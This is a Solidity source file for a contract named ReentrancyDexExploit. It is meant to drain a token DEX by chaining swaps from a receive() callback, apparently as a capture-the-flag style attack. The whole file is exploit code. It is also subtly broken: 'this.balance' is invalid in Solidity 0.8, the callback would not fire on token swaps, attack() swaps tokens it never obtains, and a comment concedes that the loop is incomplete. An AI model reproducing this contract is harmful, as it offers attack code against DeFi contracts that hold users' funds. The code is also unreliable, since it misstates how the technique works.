pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint);
    function transferFrom(address, address, uint) external returns (bool);
}

interface IDex {
    function swap(address from, address to, uint amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
}

contract ReentrancyDexExploit {
    IDex public immutable target;
    address public immutable token1;
    address public immutable token2;

    constructor(address _target) {
        target = IDex(_target);
        token1 = target.token1();
        token2 = target.token2();
    }

    function attack() public {
        uint amount = IERC20(token1).balanceOf(msg.sender);
        target.swap(token1, token2, amount);
    }

    receive() external payable {
        if (this.balance > 0) return;
        uint t1Bal = IERC20(token1).balanceOf(address(this));
        if (t1Bal > 0) target.swap(token1, token2, t1Bal);
        uint t2Bal = IERC20(token2).balanceOf(address(this));
        if (t2Bal > 0) target.swap(token2, token1, t2Bal);
        // Note: Actual reentrancy loop requires more nuanced logic
    }
}